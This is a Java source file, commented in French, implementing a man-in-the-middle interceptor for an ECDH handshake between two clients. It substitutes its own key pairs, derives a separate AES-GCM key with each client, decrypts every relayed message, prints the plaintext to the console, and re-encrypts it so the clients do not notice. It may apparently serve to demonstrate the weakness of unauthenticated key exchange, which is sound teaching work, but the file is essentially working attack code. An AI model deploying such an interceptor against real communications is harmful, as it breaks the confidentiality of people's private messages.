import java.util.Base64;
import java.util.Arrays;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.security.*;
import java.security.spec.*;

public class ServerInterceptor {

    // Paire MITM et clé AES pour chaque client
    private KeyPair mitmKey1, mitmKey2;
    private SecretKey aesKey1, aesKey2;

    public ServerInterceptor() {
        System.out.println("[Server] MITM mode (ECDH handshake interception)");
    }

    /**
     * Intercepte le handshake ECDH d’un client.
     * Génère une paire MITM et calcule la clé AES MITM correspondante.
     * @param clientPublicB64 Clé publique Base64 envoyée par le client
     * @param clientId 1 ou 2 selon le client
     * @return clé publique MITM à renvoyer au client (Base64)
     * @throws Exception
     */
    public String performHandshake(String clientPublicB64, int clientId) throws Exception {
        // Générer paire MITM
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("EC");
        kpg.initialize(new ECGenParameterSpec("secp256r1"));
        KeyPair mitmKey = kpg.generateKeyPair();

        // Décoder clé publique du client
        byte[] clientKeyBytes = Base64.getDecoder().decode(clientPublicB64);
        KeyFactory kf = KeyFactory.getInstance("EC");
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(clientKeyBytes);
        PublicKey clientPub = kf.generatePublic(keySpec);

        // Calcul secret partagé MITM <-> client
        KeyAgreement ka = KeyAgreement.getInstance("ECDH");
        ka.init(mitmKey.getPrivate());
        ka.doPhase(clientPub, true);
        byte[] sharedSecret = ka.generateSecret();

        // Dérivation clé AES-128
        MessageDigest sha = MessageDigest.getInstance("SHA-256");
        byte[] derivedKey = sha.digest(sharedSecret);
        SecretKey aesKey = new SecretKeySpec(Arrays.copyOf(derivedKey, 16), "AES");

        // Stockage des clés MITM
        if (clientId == 1) {
            mitmKey1 = mitmKey;
            aesKey1 = aesKey;
        } else {
            mitmKey2 = mitmKey;
            aesKey2 = aesKey;
        }

        // Retourner clé publique MITM au client
        return Base64.getEncoder().encodeToString(mitmKey.getPublic().getEncoded());
    }

    /**
     * Relaye un message entre clients en déchiffrant et affichant le texte clair.
     * @param message message Base64 envoyé par le client
     * @param fromClient client émetteur (1 ou 2)
     * @param toClient client destinataire (1 ou 2)
     * @return message Base64 à renvoyer au destinataire
     */
    public String onMessageRelay(String message, int fromClient, int toClient) {
        try {
            SecretKey fromKey = (fromClient == 1) ? aesKey1 : aesKey2;
            SecretKey toKey   = (toClient == 1) ? aesKey1 : aesKey2;

            // Décodage Base64
            byte[] data = Base64.getDecoder().decode(message);
            byte[] ivReceived = Arrays.copyOfRange(data, 0, 12);
            byte[] cipherText = Arrays.copyOfRange(data, 12, data.length);

            // Déchiffrement AES-GCM
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec specDec = new GCMParameterSpec(128, ivReceived);
            cipher.init(Cipher.DECRYPT_MODE, fromKey, specDec);
            byte[] plainBytes = cipher.doFinal(cipherText);

            String plainText = new String(plainBytes, "UTF-8");
            System.out.println("[MITM] Intercepted from client " + fromClient + ": " + plainText);

            // --- RECHIFFREMENT pour destinataire ---
            byte[] ivNew = new byte[12];
            new SecureRandom().nextBytes(ivNew); // IV aléatoire
            GCMParameterSpec specEnc = new GCMParameterSpec(128, ivNew);

            cipher.init(Cipher.ENCRYPT_MODE, toKey, specEnc);
            byte[] newCipher = cipher.doFinal(plainBytes);

            // Concaténation IV + ciphertext
            byte[] combined = new byte[ivNew.length + newCipher.length];
            System.arraycopy(ivNew, 0, combined, 0, ivNew.length);
            System.arraycopy(newCipher, 0, combined, ivNew.length, newCipher.length);

            return Base64.getEncoder().encodeToString(combined);

        } catch (Exception e) {
            e.printStackTrace();
            return message; // Relayer brut si erreur
        }
    }
}